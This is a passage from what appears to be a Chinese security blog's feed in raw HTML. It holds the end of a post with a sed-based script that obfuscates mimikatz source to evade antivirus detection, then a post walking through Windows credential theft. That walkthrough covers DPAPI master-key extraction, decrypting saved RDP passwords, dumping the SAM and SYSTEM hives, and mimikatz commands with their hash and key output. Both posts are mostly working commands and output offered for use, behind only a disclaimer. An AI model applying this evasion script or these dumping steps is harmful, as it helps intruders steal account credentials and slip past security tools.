-<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ngc/nGc/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/lsadump/lsADumP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/crypto/cRyPTO/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/kerberos/kErberoS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/token/tOKEn/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/misc/mIsC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/minesweeper/mInesWeEpEr/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/vault/vAULt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/privilege/PRIViLeGe/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/process/ProCeSs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/busylight/bUsYlIght/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sr98/sR98/g&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Sub-function Names ##</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sekurlsa #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/msv/mSv/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/wdigest/wDiGeST/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tspkg/tsPkG/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/livessp/liVeSsP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudap/clOuDAp/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ssp/sSp/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/logonpasswords/loGonPaSSworDs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/minidump/mIniDumP/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/bootkey/bOOtKey/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/pth/ptH/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/krbtgt/krbTgT/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/backupkeys/backUpKeyS/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tickets/ticKets/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ekeys/eKeYs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/credman/crEdMan/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/tickets/ticKets/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ekeys/eKeYs/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crypto #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/providers/prOviDers/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/certificates/certIfiCatEs/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/scauth/sCaUth/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/extract/exTraCt/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dpapi #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/masterkey/masTerKeY/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/credhist/crEdHiSt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudapkd/clOudApKd/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cloudapreg/clOuDapReg/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kerberos #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/golden/golDen/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ptt/pTt/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/clist/cLiSt/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lsadump #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/secrets/seCrEts/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/sam/saM/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dcshadow/dCShAdoW/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/dcsync/dCsYnC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/setntlm/seTnTlM/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/netsync/neTSynC/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cache/caCHe/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># misc #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/regedit/reGeDit/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/skeleton/sKeLeToN/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/easyntlmchall/easYnTlmChaLl/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/ncroutemon/nCroUTeMoN/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/taskmgr/taSkMgR/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/aadcookie/aAdcOoKiE/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vault #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/cred/crEd/g&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># token #</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/elevate/eleVatE/g&quot;</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -print0 | xargs -0 sed -i <span class="string">&quot;s/revert/reVeRt/g&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Replace file names ##</span></span><br><span class="line"></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -name <span class="string">&quot;*mimikatz*&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> FILE ; <span class="keyword">do</span></span><br><span class="line">newfile=<span class="string">&quot;<span class="subst">$(echo $&#123;FILE&#125; |sed -e <span class="string">&quot;s/mimikatz/<span class="variable">$mimi</span>/g&quot;</span>)</span>&quot;</span>;</span><br><span class="line">mv <span class="string">&quot;<span class="variable">$&#123;FILE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;newfile&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">find windows/ -<span class="built_in">type</span> f -name <span class="string">&quot;*kiwi*&quot;</span> | <span class="keyword">while</span> <span class="built_in">read</span> FILE ; <span class="keyword">do</span></span><br><span class="line">newfile=<span class="string">&quot;<span class="subst">$(echo $&#123;FILE&#125; |sed -e <span class="string">&quot;s/kiwi/<span class="variable">$kiwi</span>/g&quot;</span>)</span>&quot;</span>;</span><br><span class="line">mv <span class="string">&quot;<span class="variable">$&#123;FILE&#125;</span>&quot;</span> <span class="string">&quot;<span class="variable">$&#123;newfile&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">## ZIP File ##</span></span><br><span class="line"></span><br><span class="line">zip -r mimi.zip ./windows</span><br></pre></td></tr></table></figure><p>然后把这串字符串给删了，改成hello word</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/15.png" alt="image-20210709155034578"></p><p>然后利用软件对图标进行提取和替换，替换后如下图</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/16.png" alt="image-20210709160159713"></p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/17.png" alt="image-20210709160237931" style="zoom: 50%;" /><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/18.png" alt="image-20210709160254519" style="zoom: 50%;" /><p>最终样式</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/FrequentToolCharacteristics/19.png" alt="image-20210709160356633"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;chowdera.com&#x2F;2021&#x2F;03&#x2F;20210311155239092N.html</span><br><span class="line">https:&#x2F;&#x2F;uknowsec.cn&#x2F;posts&#x2F;notes&#x2F;FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</span><br><span class="line">https:&#x2F;&#x2F;choge.top&#x2F;2020&#x2F;08&#x2F;16&#x2F;Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;gist.githubusercontent.com&#x2F;S3cur3Th1sSh1t&#x2F;08623de0c5cc67d36d4a235cec0f5333&#x2F;raw&#x2F;dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9&#x2F;ObfuscateMimi_First.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows本地密码抓取</title>
    <link href="https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/"/>
    <id>https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/</id>
    <published>2021-06-09T15:45:42.000Z</published>
    <updated>2021-07-07T06:02:55.824Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>学！后续会持续更新</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/1.png" alt="image-20210611163901510"></p><h2 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h2><h3 id="DPAPI解密"><a href="#DPAPI解密" class="headerlink" title="DPAPI解密"></a>DPAPI解密</h3><p>使用用户登录密码解密Master Key file，获得Master Key</p><p>固定位置： <code>%APPDATA%\Microsoft\Protect\%SID%</code>下往往有多个Master Key file</p><p>这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)</p><p><code>%APPDATA%\Microsoft\Protect\%SID%</code>下存在一个固定文件<code>Preferred</code>，包含最后一个Master Key file的名称和创建时间，文件结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _tagPreferredMasterKey</span><br><span class="line">&#123;</span><br><span class="line">  GUID guidMasterKey;</span><br><span class="line">  FILETIME ftCreated;</span><br><span class="line">&#125; PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;</span><br></pre></td></tr></table></figure><p>完整的流程：</p><ul><li>找到本机的Master Key file</li><li>从Master Key file中获取到Master Key</li><li>通过Master Key解密DPAPI blob获得明文</li></ul><h3 id="本地保存RDP密码"><a href="#本地保存RDP密码" class="headerlink" title="本地保存RDP密码"></a>本地保存RDP密码</h3><p>首先需要打开<strong>隐藏受保护的操作系统文件</strong>，不打开的话就算打开了显示<strong>隐藏的文件、文件夹和驱动器</strong>也是看不到的</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/2.png" alt="image-20210607105330176" style="zoom:50%;" /><p>接着打开文件<code>C:\Users\用户名\AppData\Local\Microsoft\Credentials</code>就可以看到保存的数据了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/3.png" alt="image-20210609134443326"></p><p>使用<code>cmdkey /line</code>命令可以查看本地保存了哪些密码，如果你连过其他服务器如果点击了保存密码就能抓取到</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/4.png" alt="image-20210607105639249"></p><p>使用🥝读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred &#x2F;in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSIONID</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/5.png" alt="image-20210608171226583"></p><p>获取到<strong>guidMasterKey</strong>其实就是我们的master key file名称</p><blockquote><p>切记一点不同的SESSIONID如果间隔时间超过90天那么对应的guidMasterKey也是不同的</p></blockquote><p>通过命令获取到Master Key file的Master Key，下文中<strong>GUID==Master Key file</strong>，<strong>MasterKey==Master Key</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021&#x2F;6&#x2F;7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">         [00000000]</span><br><span class="line">         * GUID      :  &#123;d3fcdbfb-06bd-49f0-98b4-ac08664c176a&#125;</span><br><span class="line">         * Time      :  2021&#x2F;6&#x2F;7 9:37:59</span><br><span class="line">         * MasterKey :  7da666987b2b6a51db3148cd01a6fe460a79315d1678a24b327d251c4f9138eecbb7ca4919de8de678628963761ee731a1316b78a6a982d0d4a9c590f5171c9e</span><br><span class="line">         * sha1(key) :  efd1c9d7290d13b3ecc1e288accfc5d6707d3403</span><br><span class="line">         [00000001]</span><br><span class="line">         * GUID      :  &#123;33449413-8697-4a85-a075-778b49015fbe&#125;</span><br><span class="line">         * Time      :  2021&#x2F;6&#x2F;8 17:17:37</span><br><span class="line">         * MasterKey :  0ac77f164c38e751f303e26d883cd15e3eb3861f2d69c2ba192035511bfc8f2880f206ef238de4d282384c813326feeaef364b9089c86a97a5169f31dbd319ee</span><br><span class="line">         * sha1(key) :  f45701db86a93d9b860be725d7eaf32a9a684a77</span><br><span class="line">         [00000002]</span><br><span class="line">         * GUID      :  &#123;788f0828-1d1e-478d-adf6-7a37e92182e8&#125;</span><br><span class="line">         * Time      :  2021&#x2F;6&#x2F;7 18:01:08</span><br><span class="line">         * MasterKey :  6a9ece2f3bd683c2ac14c69e13465399e9ce20c2930dd51dd9378eed800b06b409f7f4bef926e503d85a0b9e5e1f4cc5ccd01fb2ddaa8de90d086bf3a8ae3bf3</span><br><span class="line">         * sha1(key) :  f2d6c58b2d2f0a91e07dc0d1cb7db7cb8935f955</span><br></pre></td></tr></table></figure><p>只需要使用<strong>SESSIONID</strong>对应的GUID和MasterKey就能解密数据了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred &#x2F;in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSION &#x2F;masterkey:对应的GUID MasterKey</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/6.png" alt="image-20210609134218324"></p><p><strong>TargetName</strong>是目标机器，<strong>UserName</strong>是账号，<strong>CredentialBlob</strong>是密码</p><h3 id="本机密码"><a href="#本机密码" class="headerlink" title="本机密码"></a>本机密码</h3><h4 id="通过注册列表抓取密码"><a href="#通过注册列表抓取密码" class="headerlink" title="通过注册列表抓取密码"></a>通过注册列表抓取密码</h4><p>首先需要管理员权限，抓取注册列表中保存的哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure><p>然后通过🥝进行解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br></pre></td></tr></table></figure><p>解密后的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https:&#x2F;&#x2F;aka.ms&#x2F;pscore6</span><br><span class="line"></span><br><span class="line">PS C:\Users\ascotbe&gt; cd .\Desktop\</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SAM SAM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; .\x64.exe</span><br><span class="line"></span><br><span class="line">  .#####.   EeLrXMiD 2.2.0 (x64) #19041 Oct 10 2020 14:46:27</span><br><span class="line"> .## ^ ##.  &quot;e2G6OxuvUXNR1&#39;Amour&quot; - (IcaHL)</span><br><span class="line"> ## &#x2F; \ ##  &#x2F;*** ST1KQSnf huXMA &#96;gVhmWw70VD&#96; ( NceCVtrwTckaqiPu3XOVsQl )</span><br><span class="line"> ## \ &#x2F; ##       &gt; https:&#x2F;&#x2F;blog.gVhmWw70VD.com&#x2F;EeLrXMiD</span><br><span class="line"> &#39;## v ##&#39;       Hp6bmVPNVLO9i7B             ( FiLGZos4eo99IXHOADBc44Ir )</span><br><span class="line">  &#39;#####&#39;        &gt; https:&#x2F;&#x2F;ljrq4GxgPj6NY7 &#x2F; https:&#x2F;&#x2F;A35s5WaTWwdjV2m6 ***&#x2F;</span><br><span class="line"></span><br><span class="line">EeLrXMiD # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">EeLrXMiD # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : 樱岛麻衣</span><br><span class="line">SysKey : 42939b566ede597c3284d1bd23b15a97</span><br><span class="line">Local SID : S-1-5-21-1645164750-2672341361-3879437546</span><br><span class="line"></span><br><span class="line">SAMKey : b58a3643feb8148887485d5b702aaf3f</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 900fff43b7507160b3e239892c034c22</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 8185175d7c176c6decf21cbfbde54df0a4b86cca948bb660091d2a873073b26b</span><br><span class="line">      aes128_hmac       (4096) : ce32484a789bb52f0e43fa09ddac2bf0</span><br><span class="line">      des_cbc_md5       (4096) : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000001f7 (503)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : 000001f8 (504)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: 4c5c287f286dce27cdd13c6b221979df</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 38ab6a222bbf783640bdcbb714227d57</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : c60e0605a0f960188d252efb376231de1e1fb3c2fbfd66cbc4a528d364a37bfc</span><br><span class="line">      aes128_hmac       (4096) : fb6b091efaa644e306673fcd565ce4f4</span><br><span class="line">      des_cbc_md5       (4096) : a1648949c202689e</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : a1648949c202689e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 42d6e016527f7bce204d94cc40baa99a</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 35c0a798a120c3b112bcdb7636b8dd3e3b12284c0e85a5b1c93bfbe9c4b83c02</span><br><span class="line">      aes128_hmac       (4096) : 12a06f6bb5ff719a314ddfe96c83c69e</span><br><span class="line">      des_cbc_md5       (4096) : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EeLrXMiD #</span><br></pre></td></tr></table></figure><p>我们只需要查看最后一个<strong>ascotbe</strong>（我本机这个是管理员用户）这个账户的Hash NTLM即可知道本机密码了，通过网站解密</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/WindowsGrabPassword/7.png" alt="image-20210610150310107"></p><h4 id="通过mimikatz抓取密码"><a href="#通过mimikatz抓取密码" class="headerlink" title="通过mimikatz抓取密码"></a>通过mimikatz抓取密码</h4><p>需要管理员权限执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>即可得出密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 